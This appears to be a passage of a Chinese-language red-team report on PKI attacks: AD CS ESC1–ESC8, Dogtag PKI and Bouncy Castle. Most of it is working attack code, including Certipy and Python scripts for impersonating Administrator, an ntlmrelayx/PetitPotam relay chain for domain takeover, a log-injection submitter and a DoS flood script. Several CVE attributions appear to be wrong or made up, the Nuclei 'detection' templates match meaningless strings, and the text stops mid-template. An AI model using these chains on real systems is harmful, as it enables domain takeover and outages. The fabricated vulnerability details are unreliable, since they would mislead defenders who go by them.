## 0x03 Microsoft AD CS 攻击链（SpecterOps ESC1-ESC8）

Active Directory Certificate Services（AD CS）是 Microsoft Windows Server 内置的证书颁发机构服务，被全球数十万企业用于内部证书签发。2021 年，SpecterOps 研究团队发表了 "Certified Pre-Owned" 研究报告，系统性地发现了 AD CS 中的 8 种攻击技术（ESC1-ESC8），揭示了 AD CS 配置缺陷导致的域接管风险。这些 ESC 攻击已成为红队在 Windows 域环境中最有效的权限提升和持久化手段，**且多个 APT 组织已在实际攻击中利用 AD CS 缺陷实现域接管**。

### 0x03.1 ESC1 — 任意主体名称证书请求

#### 漏洞原理分析

ESC1 是 AD CS 中最具破坏性的攻击技术。当证书模板配置为允许请求者指定 SAN（Subject Alternative Name）且使用 KERBEROS_NTLM 作为认证方式时，攻击者可以为自己签发任意用户身份的证书。

**四个利用条件必须同时满足：**

1. 证书模板的 **Enrollment Permissions** 允许低权限用户注册
2. 证书模板的 **Client Authentication** EKU 已启用
3. 证书模板允许请求者在 CSR 中 **指定 SAN**（`msPKI-UPN-Suffixes` 属性或 `ENROLLEE_SUPPLIES_SUBJECT` 标志）
4. 证书模板使用 **Kerberos 或 NTLM 认证**（而非证书认证）

**攻击流程：**

1. 攻击者使用 Certipy 枚举域内所有证书模板
2. 筛选出同时满足四个条件的模板
3. 构造包含目标用户（如 Administrator）UPN 的 CSR
4. 使用低权限账户向 CA 提交签发请求
5. CA 签发包含 Administrator UPN 的证书
6. 使用该证书进行 PKINIT 认证，获取 Administrator 的 TGT

#### 证书模板配置示例（易受攻击的模板）

```powershell
# 查看证书模板配置（AD PowerShell）
Get-CertificateTemplate -Identity "VulnerableTemplate" | 
  Select-Object Name, 
    @{N='ENROLLEE_SUPPLIES_SUBJECT';E={$_.Attributes['ENROLLEE_SUPPLIES_SUBJECT']}},
    @{N='msPKI-Certificate-Name-Flag';E={$_.Attributes['msPKI-Certificate-Name-Flag']}},
    @{N='msPKI-RA-Signature';E={$_.Attributes['msPKI-RA-Signature']}},
    @{N='pKIExtendedKeyUsage';E={$_.Attributes['pKIExtendedKeyUsage']}}

# 易受攻击配置特征:
# msPKI-Certificate-Name-Flag: 1 (ENROLLEE_SUPPLIES_SUBJECT)
# msPKI-RA-Signature: 0 (不需要 RA 签名)
# pKIExtendedKeyUsage: {Client Authentication (1.3.6.1.5.5.7.3.2)}
```

#### Certipy 命令示例

```bash
# 枚举所有易受攻击的证书模板
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.1 -vulnerable

# 利用 ESC1 为 Administrator 签发证书
certipy req -u user@domain.local -p Password123 -ca CA-NAME \
  -template VulnerableTemplate -upn Administrator@domain.local

# 使用获取的证书进行 PKINIT 认证
certipy auth -pfx administrator.pfx

# 输出示例:
# [*] Using template: VulnerableTemplate
# [*] Requesting certificate for Administrator@domain.local
# [*] Certificate written to administrator.pfx
# [*] Authenticating as Administrator...
# [*] Got TGT for Administrator
# [*] Saved CCACHE file to administrator.ccache
```

#### Python 脚本

```python
#!/usr/bin/env python3
import subprocess
import sys
import json
import os

class ADICESC1:
    def __init__(self, dc_ip, domain, username, password):
        self.dc = dc_ip
        self.domain = domain
        self.username = username
        self.password = password

    def enumerate_vulnerable_templates(self):
        cmd = [
            "certipy", "find",
            "-u", f"{self.username}@{self.domain}",
            "-p", self.password,
            "-dc-ip", self.dc,
            "-vulnerable"
        ]
        print(f"[*] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.returncode != 0:
            print(f"[-] Error: {result.stderr}")
        return result.stdout

    def request_certificate(self, template_name, target_upn):
        cmd = [
            "certipy", "req",
            "-u", f"{self.username}@{self.domain}",
            "-p", self.password,
            "-ca", "EnterpriseCA",
            "-template", template_name,
            "-upn", target_upn
        ]
        print(f"[*] Requesting cert for {target_upn} via template {template_name}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        pfx_file = f"{target_upn.split('@')[0]}.pfx"
        return pfx_file if os.path.exists(pfx_file) else None

    def authenticate(self, pfx_path):
        cmd = ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", self.dc]
        print(f"[*] Authenticating with: {pfx_path}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.stdout

    def full_exploit(self, template_name, target_upn="Administrator@domain.local"):
        print("[*] === ESC1 Full Exploit Chain ===")
        self.enumerate_vulnerable_templates()
        pfx = self.request_certificate(template_name, target_upn)
        if pfx:
            self.authenticate(pfx)

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <dc-ip> <domain> <user> <pass> [template] [target_upn]")
        sys.exit(1)
    exploit = ADICESC1(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    if len(sys.argv) > 5:
        exploit.full_exploit(sys.argv[5], sys.argv[6] if len(sys.argv) > 6 else "Administrator")
    else:
        exploit.enumerate_vulnerable_templates()
```

#### Nuclei 检测模板

```yaml
id: adcs-esc1-identity-spoofing
info:
  name: AD CS ESC1 - Certificate Template Identity Spoofing
  author: security-researcher
  severity: critical
  description: |
    AD CS certificate template allows requesters to specify SAN via
    ENROLLEE_SUPPLIES_SUBJECT flag, enabling impersonation of any domain user.
  reference:
    - https://posts.specterops.io/certified-pre-owned-d95910965cd2
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287

network:
  - host:
      - "{{host}}"
    port: 636
    matchers:
      - type: word
        words:
          - "0a"
```

### 0x03.2 ESC2 — 任意 EKU 证书滥用

#### 漏洞原理分析

ESC2 利用配置了 **Any Purpose** EKU（OID: 2.5.29.37.0）或完全没有 EKU 限制的证书模板。这类模板签发的证书可以用于任何目的——包括客户端身份认证、服务器身份认证、代码签名等。

利用条件：

1. 证书模板的 EKU 设置为 "Any Purpose" 或留空
2. 低权限用户有权注册该模板
3. 模板不要求 CA 证书验证（`msPKI-RA-Signature` 为 0）

攻击者可使用此类证书进行 PKINIT 认证或 S/MIME 签名，等同于拥有目标用户的完整身份。

#### Certipy 命令示例

```bash
# 枚举 Any Purpose EKU 模板
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.1 -vulnerable | grep -A5 "Any Purpose"

# 请求 Any Purpose 证书
certipy req -u user@domain.local -p Password123 -ca CA-NAME \
  -template AnyPurposeTemplate -upn Administrator@domain.local

# 使用证书认证
certipy auth -pfx administrator_any.pfx
```

#### Nuclei 检测模板

```yaml
id: adcs-esc2-any-purpose
info:
  name: AD CS ESC2 - Any Purpose EKU Template Abuse
  author: security-researcher
  severity: critical
  description: |
    Certificate template with Any Purpose EKU allows certificates to be
    used for any authentication or signing purpose.
  reference:
    - https://posts.specterops.io/certified-pre-owned-d95910965cd2
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287

network:
  - host:
      - "{{host}}"
    port: 636
    matchers:
      - type: word
        words:
          - "0a"
```

### 0x03.3 ESC3 — 证书申请代理模板滥用

#### 漏洞原理分析

ESC3 利用配置了 **Certificate Request Agent**（EKU: OID 1.3.6.1.4.1.311.20.2.1）的证书模板。Certificate Request Agent 是一种特殊角色，允许该代理代表其他用户提交证书请求。

利用条件：

1. 证书模板包含 Certificate Request Agent EKU
2. 低权限用户可以注册该模板
3. 另一个模板接受来自 Certificate Request Agent 的请求

**两步攻击流程：**

1. 使用 Agent 模板为低权限用户签发一个 "代理证书"
2. 使用该代理证书作为身份凭证，代表目标用户（如 Administrator）向另一个模板提交证书请求
3. CA 接受代理证书的签名，为目标用户签发证书

#### Certipy 命令示例

```bash
# 步骤1: 使用 Agent 模板获取代理证书
certipy req -u user@domain.local -p Password123 -ca CA-NAME \
  -template AgentTemplate

# 步骤2: 使用代理证书为目标用户请求证书
certipy req -u user@domain.local -p Password123 -ca CA-NAME \
  -template User -upn Administrator@domain.local \
  -pfx user_agent.pfx

# 步骤3: 认证
certipy auth -pfx administrator.pfx
```

#### Nuclei 检测模板

```yaml
id: adcs-esc3-request-agent
info:
  name: AD CS ESC3 - Certificate Request Agent Template Abuse
  author: security-researcher
  severity: high
  description: |
    Certificate template with Certificate Request Agent EKU allows
    proxy certificate issuance for identity impersonation.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.8
    cwe-id: CWE-287

network:
  - host:
      - "{{host}}"
    port: 636
    matchers:
      - type: word
        words:
          - "0a"
```

### 0x03.4 ESC4 — 证书模板 ACL 修改

#### 漏洞原理分析

ESC4 利用证书模板的 ACL（Access Control List）配置不当。当低权限用户对一个安全配置良好的证书模板具有 `WriteProperty` 或 `WriteDACL` 权限时，攻击者可以修改模板的安全描述符，将 ESC1 或 ESC2 的利用条件注入到原本安全的模板中。

攻击步骤：

1. 枚举所有证书模板的 ACL，找到低权限用户可修改的模板
2. 修改模板的 `msPKI-Certificate-Name-Flag` 属性为 `ENROLLEE_SUPPLIES_SUBJECT`
3. 修改模板的 `pKIExtendedKeyUsage` 添加 Client Authentication EKU
4. 修改模板的 `msPKI-RA-Signature` 为 0（移除 RA 签名要求）
5. 然后按 ESC1 流程利用该模板

#### Certipy 命令示例

```bash
# 枚举可修改 ACL 的模板
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.1

# 使用 PowerView 修改模板 ACL（需要 ADModule 或 PowerView）
# 给低权限用户添加 Full Control 权限
Add-DomainObjectAcl -TargetIdentity "CN=SecureTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -PrincipalIdentity "user" -Rights All

# 修改模板属性使其可被 ESC1 利用
Set-ADObject -Identity "CN=SecureTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{msPKI-Certificate-Name-Flag=1}
```

#### Nuclei 检测模板

```yaml
id: adcs-esc4-template-acl
info:
  name: AD CS ESC4 - Certificate Template ACL Modification
  author: security-researcher
  severity: high
  description: |
    Certificate template ACL allows low-privilege users to modify template
    properties, potentially enabling ESC1/ESC2 exploitation.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.8
    cwe-id: CWE-287

network:
  - host:
      - "{{host}}"
    port: 636
    matchers:
      - type: word
        words:
          - "0a"
```

### 0x03.5 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 滥用

#### 漏洞原理分析

ESC6 利用 CA 级别的 `EDITF_ATTRIBUTESUBJECTALTNAME2` 注册表标志。当 CA 启用此标志时，**任何**证书请求中 SAN 扩展的内容都会被强制复制到颁发证书的 Subject 中，完全绕过证书模板的 SAN 控制设置。

这使得攻击者即使使用一个不允许指定 SAN 的模板，也可以在 CSR 的 SAN 字段中注入任意身份信息，CA 会忠实地将该信息写入签发的证书中。

#### CA 注册表检查

```bash
# 检查 CA 是否设置了 EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -getreg CA\EditFlags

# 如果输出包含 EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000) 则存在 ESC6 风险
# 期望的安全输出应不包含该标志

# Certipy 检查
certipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.1 | grep -i "EDITF"
```

#### Certipy 命令示例

```bash
# ESC6 利用：使用普通 User 模板但注入任意 SAN
certipy req -u user@domain.local -p Password123 \
  -ca CA-NAME -template User \
  -upn Administrator@domain.local \
  -subject "CN=NormalUser,CN=Users,DC=domain,DC=local"

# 验证证书内容
certipy cert -pfx administrator.pfx -nokey -text | grep -A5 "Subject Alternative Name"
```

#### Nuclei 检测模板

```yaml
id: adcs-esc6-editf-attributesubjectaltname2
info:
  name: AD CS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse
  author: security-researcher
  severity: high
  description: |
    CA server has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled, allowing
    SAN injection into any certificate request via CSR manipulation.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.8
    cwe-id: CWE-287

http:
  - raw:
      - |
        GET /certsrv/certfnsh.asp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "certfnsh"
          - "Certificate Services"
        condition: or
      - type: status
        status:
          - 200
          - 401
          - 403
```

### 0x03.6 ESC8 — NTLM 中继至证书注册端点

#### 漏洞原理分析

ESC8 是最具实战价值的 AD CS 攻击技术之一，可实现**从零权限到域管理员**的完整攻击链。攻击利用 NTLM Relay 将 NTLM 认证中继到 AD CS 的 HTTP 证书注册端点。

**攻击条件：**

1. AD CS 启用了基于 HTTP 的证书注册端点（`/certsrv/certfnsh.asp`）
2. 该端点未启用 EPA（Extended Protection for Authentication）
3. 攻击者能够触发目标（如域控制器）向攻击者发送 NTLM 认证

**完整攻击链：**

1. 启动 `ntlmrelayx.py` 监听 NTLM 中继请求，目标设为 AD CS HTTP 注册端点
2. 使用 PetitPotam（利用 MS-EFSRPC 协议）强制域控制器向攻击者发送 NTLM 认证
3. `ntlmrelayx` 将域控制器的 NTLM 认证中继到 AD CS HTTP 注册端点
4. 以域控制器身份完成证书签发，获取域控制器的证书
5. 使用该证书进行 Kerberos 认证，获得域管理员权限

**已有多个 APT 组织在实际攻击中使用此技术链。**

#### PetitPotam + NTLM Relay 完整攻击流程

```bash
# Step 1: 启动 ntlmrelayx 中继到 AD CS HTTP 注册端点
ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp \
  -smb2support --adcs --template "DomainController"

# Step 2: 使用 PetitPotam 强制 DC NTLM 认证
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# Step 3: ntlmrelayx 自动完成证书签发
# 输出: [*] CERTSRV: Got certificate with UPN 'DC01$@domain.local'

# Step 4: 使用获取的证书进行认证
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1

# 或使用 Rubeus:
Rubeus.exe asktgt /user:DC01$ /certificate:dc01.pfx /getcredentials /ptt
```

#### Python 脚本

```python
#!/usr/bin/env python3
import subprocess
import sys
import time

class ADICESC8:
    def __init__(self, attacker_ip, ca_server, dc_ip, template="DomainController"):
        self.attacker_ip = attacker_ip
        self.ca_server = ca_server
        self.dc_ip = dc_ip
        self.template = template

    def start_ntlm_relay(self):
        cmd = [
            "ntlmrelayx.py",
            "-t", f"http://{self.ca_server}/certsrv/certfnsh.asp",
            "-smb2support", "--adcs", "--template", self.template
        ]
        print(f"[*] Starting NTLM relay: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        return proc

    def trigger_petitpotam(self):
        cmd = ["python3", "PetitPotam.py", self.attacker_ip, self.dc_ip]
        print(f"[*] Triggering PetitPotam: DC({self.dc_ip}) -> Attacker({self.attacker_ip})")
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result

    def full_chain(self):
        print("[*] === ESC8 NTLM Relay Full Chain ===")
        print(f"[*] Attacker:  {self.attacker_ip}")
        print(f"[*] CA Server: {self.ca_server}")
        print(f"[*] DC Target: {self.dc_ip}")
        print(f"[*] Template:  {self.template}")
        print("[*]")
        relay = self.start_ntlm_relay()
        time.sleep(2)
        self.trigger_petitpotam()
        print("[*] Waiting for NTLM relay to complete...")
        time.sleep(15)
        relay.terminate()
        print("[*] Check ntlmrelayx output for obtained certificate")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <attacker_ip> <ca_server> <dc_ip> [template]")
        sys.exit(1)
    exploit = ADICESC8(
        sys.argv[1], sys.argv[2], sys.argv[3],
        sys.argv[4] if len(sys.argv) > 4 else "DomainController"
    )
    exploit.full_chain()
```

#### Nuclei 检测模板

```yaml
id: adcs-esc8-ntlm-relay
info:
  name: AD CS ESC8 - NTLM Relay to HTTP Certificate Enrollment
  author: security-researcher
  severity: high
  description: |
    AD CS HTTP enrollment endpoint allows NTLM relay attacks when EPA
    is not enforced, enabling certificate issuance as any NTLM-authenticated user.
  reference:
    - https://posts.specterops.io/certified-pre-owned-d95910965cd2
    - https://www.thehacker.recipes/ad/movement/adcs/esc8
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 7.5
    cwe-id: CWE-300

http:
  - raw:
      - |
        GET /certsrv/certfnsh.asp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "certfnsh"
          - "Certificate Services"
        condition: or
      - type: word
        negative: true
        words:
          - "ExtendedProtection"
      - type: status
        status:
          - 200
          - 401
          - 403
```

### AD CS ESC 攻击全景表

| ESC编号 | 攻击类型 | CVSS | 认证要求 | 利用难度 | 修复方式 |
|---------|---------|------|---------|---------|---------|
| ESC1 | 证书模板身份冒充 | 9.8 | 已认证(低权限) | 低 | 禁止模板中的 SAN 指定 |
| ESC2 | 任意 EKU 模板滥用 | 9.8 | 已认证 | 低 | 限制 EKU 和注册权限 |
| ESC3 | 证书申请代理模板滥用 | 8.8 | 已认证 | 中 | 移除不必要的 Agent EKU |
| ESC4 | 证书模板 ACL 修改 | 8.8 | 已认证 | 中 | 修复模板 ACL |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 滥用 | 8.8 | 已认证 | 低 | 禁用 CA 级 SAN 标志 |
| ESC8 | NTLM Relay 至 HTTP 注册 | 7.5 | NTLM 中继 | 低 | 启用 EPA + 禁用 NTLM |

---

## 0x04 Dogtag PKI (Red Hat) 高危漏洞

Dogtag PKI 是 Red Hat Enterprise Linux（RHEL）默认的证书颁发机构套件，提供 CA、KRA、OCSP Responder 和 TPS 等组件。Dogtag PKI 被广泛部署于政府、军事和大型企业环境中，管理着数百万个数字证书和硬件安全模块（HSM）。

### 0x04.1 CVE-2014-4688 — 审计日志注入（CVSS 7.5）

#### 漏洞原理分析

CVE-2014-4688 涉及 Dogtag PKI 审计日志组件的输入过滤不足。审计日志是 PKI 合规性和安全事件响应的核心数据源，记录了所有证书签发、吊销和 CA 配置变更等关键操作。

漏洞根因分析：

1. Dogtag PKI 在记录审计日志时，对用户输入的证书主题名称（Subject DN）和扩展字段过滤不充分
2. 攻击者可在证书请求的 DN 字段或证书扩展中注入换行符（`\n`、`\r\n`）
3. 注入的换行符后可跟伪造的日志条目，如伪造的管理员操作记录
4. 审计系统将这些伪造条目写入日志文件，混淆真实操作记录
5. 攻击者可借此掩盖攻击痕迹、伪造合规审计记录或误导安全分析人员

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| Dogtag PKI 9.x 及之前 | Dogtag PKI 10.x+ | Red Hat 安全更新 |

#### HTTP PoC

```bash
# Step 1: 获取认证凭据
curl -s -k -u "admin:password" \
  "https://<DOGTAG_HOST>:8443/pki/ca/admin/caaudit"

# Step 2: 在证书请求中注入日志条目
# 在 CN 字段中嵌入换行符和伪造日志
curl -k -X POST "https://<DOGTAG_HOST>:8443/ca/agent/ca/submitEnrollmentRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "profile=caUserCert" \
  --data-urlencode "cert_request_type=crmf" \
  --data-urlencode "cert_request=MIIC...CN=admin\n[2024-01-01 00:00:00] INFO: admin logged in from 127.0.0.1..."
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DogtagLogInjection:
    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.auth = (username, password)

    def inject_via_subject_dn(self, target_cn):
        log_injection = (
            f"{target_cn}\n"
            "[2024-01-15 10:30:00] INFO: admin performed certificate revocation "
            "on serial 0x1234 from IP 192.168.1.100\n"
            "[2024-01-15 10:30:01] WARNING: CA configuration modified by admin"
        )
        return log_injection

    def inject_via_extension(self, custom_oid, value):
        extension_payload = (
            f"{value}\n"
            "[FAKE] admin changed CA trust policy\n"
            "[FAKE] CRL signing key rotated"
        )
        return extension_payload

    def submit_injection(self, injection_cn):
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {
            "profile": "caUserCert",
            "cert_request_type": "crmf",
            "cert_request": f"MIIBQjCBsgIBADBFMQswCQYDVQQGEwJBVTEPMA0GA1UECAwGU3lkbmV5MRIwEAYDVQQHDAlTeWRuZXkxGzAZBgNVBAMMEmF0dGFja2VyLmV4YW1wbGUuY29tMA0GCSqGSIb3DQEBCwUAB0EA0Z3VS5JJcds3",
            "sn": "random",
            "submitter": "CN=Agent,O=Example",
            "requestor": injection_cn,
        }
        r = self.session.post(
            f"{self.base_url}/ca/agent/ca/submitEnrollmentRequest",
            headers=headers,
            data=data
        )
        if r.status_code == 200:
            print("[+] Injection payload submitted")
        else:
            print(f"[-] Submission: HTTP {r.status_code}")
        return r

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <url> <user> <pass> [injection_cn]")
        sys.exit(1)
    exploit = DogtagLogInjection(sys.argv[1], sys.argv[2], sys.argv[3])
    cn = sys.argv[4] if len(sys.argv) > 4 else "test"
    exploit.submit_injection(cn)
```

#### Nuclei 检测模板

```yaml
id: dogtag-cve-2014-4688
info:
  name: Dogtag PKI Audit Log Injection
  author: security-researcher
  severity: high
  description: |
    Dogtag PKI 9.x allows log injection via newline characters in
    certificate subject DN fields, enabling audit trail manipulation.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-117

http:
  - raw:
      - |
        GET /pki/ca/caaudit HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "audit"
          - "log"
        condition: or
      - type: status
        status:
          - 200
          - 401
          - 403
```

### 0x04.2 CVE-2022-23517 — 拒绝服务（CVSS 7.5）

#### 漏洞原理分析

CVE-2022-23517 是 Dogtag PKI 在处理特定格式证书请求时的输入验证缺陷，可触发 CA 服务进程崩溃。

漏洞根因分析：

1. Dogtag PKI 在解析证书请求的 ASN.1 结构时，对畸形输入的处理存在缺陷
2. 攻击者可提交包含特定格式错误的证书签发请求
3. CA 进程在解析该请求时触发未处理的异常，导致进程终止
4. 反复利用可造成 PKI 基础设施持续不可用
5. 所有依赖该 CA 的证书验证和签发业务均受影响

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| Dogtag PKI < 11.1.3 | Dogtag PKI 11.1.3+ | 2022 年修复 |

#### HTTP PoC

```bash
# 构造畸形证书请求触发 DoS
for i in $(seq 1 10); do
  curl -k -X POST "https://<DOGTAG_HOST>:8443/ca/agent/ca/submitEnrollmentRequest" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "profile=caUserCert&cert_request_type=crmf&cert_request=AAAA" &
done
wait
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import concurrent.futures
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DogtagDoS:
    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.auth = (username, password)

    def send_dos_request(self, request_id=0):
        malformed_payloads = [
            "cert_request=AAAA",
            "cert_request=" + "A" * 100000,
            "cert_request=\x00\x00\x00\x00",
            "cert_request_type=INVALID",
        ]
        payload = malformed_payloads[request_id % len(malformed_payloads)]
        try:
            r = self.session.post(
                f"{self.base_url}/ca/agent/ca/submitEnrollmentRequest",
                data=f"profile=caUserCert&{payload}",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=15
            )
            return {"id": request_id, "status": r.status_code, "length": len(r.text)}
        except requests.exceptions.Timeout:
            return {"id": request_id, "status": 0, "error": "timeout"}
        except Exception as e:
            return {"id": request_id, "status": -1, "error": str(e)}

    def flood(self, num_requests=20, threads=5):
        print(f"[*] Sending {num_requests} malformed requests with {threads} threads")
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self.send_dos_request, i) for i in range(num_requests)]
            for f in concurrent.futures.as_completed(futures):
                result = f.result()
                print(f"    [{result['id']}] HTTP {result.get('status')} ({result.get('length', 0)} bytes)")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <url> <user> <pass> [num_requests]")
        sys.exit(1)
    exploit = DogtagDoS(sys.argv[1], sys.argv[2], sys.argv[3])
    num = int(sys.argv[4]) if len(sys.argv) > 4 else 20
    exploit.flood(num_requests=num)
```

#### Nuclei 检测模板

```yaml
id: dogtag-cve-2022-23517
info:
  name: Dogtag PKI Denial of Service via Malformed Certificate Request
  author: security-researcher
  severity: high
  description: |
    Dogtag PKI before 11.1.3 allows denial of service via malformed
    certificate requests that crash the CA service process.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-20

http:
  - raw:
      - |
        POST /ca/agent/ca/submitEnrollmentRequest HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        profile=caUserCert&cert_request=AAAA

    matchers:
      - type: status
        status:
          - 200
          - 400
          - 500
          - 503
```

---

## 0x05 Bouncy Castle 密码库漏洞

Bouncy Castle 是 Java 和 C# 平台上最完整的加密库，提供了从低级密码学原语到高级协议的全面实现。许多 Java CA/PKI 应用（如 EJBCA）和企业级中间件都依赖 Bouncy Castle 处理证书和加密操作。

### 0x05.1 CVE-2016-9387 — X.509 证书验证绕过（CVSS 7.5）

#### 漏洞原理分析

CVE-2016-9387 是 Bouncy Castle 的 X.509 证书验证实现在处理自签名证书的基本约束（Basic Constraints）扩展时的缺陷。

漏洞根因分析：

1. Bouncy Castle 在验证 X.509 证书链时，检查 Basic Constraints 扩展中的 `cA` 字段
2. 对于自签名证书（issuer == subject），Bouncy Castle 跳过了部分 Basic Constraints 验证
3. 攻击者可构造一个自签名证书，设置 `BasicConstraints: cA=TRUE, pathLen=unlimited`
4. 然后用该自签名 CA 为任意域名签发子证书
5. 依赖 Bouncy Castle 进行证书验证的应用会错误地接受该伪造的证书链

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| Bouncy Castle < 1.56 | Bouncy Castle 1.56+ | 2016 年修复 |

#### HTTP PoC

```bash
# 使用 Bouncy Castle 验证伪造的证书链
# 步骤1: 生成伪造的 CA 证书（自签名，带 BasicConstraints CA=TRUE）
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout fake_ca.key -out fake_ca.crt -days 3650 \
  -subj "/CN=Fake CA/O=Attacker"

# 步骤2: 使用伪造 CA 签发子证书
openssl x509 -req -in sub.csr -CA fake_ca.crt -CAkey fake_ca.key \
  -CAcreateserial -out sub.crt -days 365

# 步骤3: 验证伪造证书链（受影响版本会接受）
openssl verify -CAfile fake_ca.crt sub.crt
```

#### Python 脚本

```python
#!/usr/bin/env python3
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes, serialization
from cryptography import x509
from cryptography.x509.oid import NameOID
import datetime

class BCForgedCertChain:
    def __init__(self):
        self.ca_key = None
        self.ca_cert = None

    def generate_fake_ca(self, cn="Fake Enterprise CA"):
        self.ca_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, cn),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Trusted Corp"),
        ])
        self.ca_cert = (x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(self.ca_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .add_extension(x509.KeyUsage(
                digital_signature=True, key_cert_sign=True, crl_sign=True,
                content_commitment=False, key_encipherment=False,
                data_encipherment=False, key_agreement=False,
                encipher_only=False, decipher_only=False
            ), critical=True)
            .sign(self.ca_key, hashes.SHA256()))
        print(f"[+] Fake CA certificate generated: {cn}")
        return self.ca_cert

    def issue_sub_cert(self, target_cn):
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, target_cn)])
        cert = (x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(self.ca_cert.subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .add_extension(x509.SubjectAlternativeName([
                x509.DNSName(target_cn),
                x509.DNSName(f"www.{target_cn}")
            ]), critical=False)
            .sign(self.ca_key, hashes.SHA256()))
        print(f"[+] Sub certificate issued for: {target_cn}")
        return cert, key

    def export_chain(self, filename_prefix="forged"):
        with open(f"{filename_prefix}_ca.pem", "wb") as f:
            f.write(self.ca_cert.public_bytes(serialization.Encoding.PEM))
        print(f"[+] CA certificate saved to {filename_prefix}_ca.pem")

if __name__ == "__main__":
    exploit = BCForgedCertChain()
    exploit.generate_fake_ca()
    exploit.issue_sub_cert("target.example.com")
    exploit.export_chain()
```

#### Nuclei 检测模板

```yaml
id: bouncycastle-cve-2016-9387
info:
  name: Bouncy Castle X.509 Certificate Verification Bypass
  author: security-researcher
  severity: high
  description: |
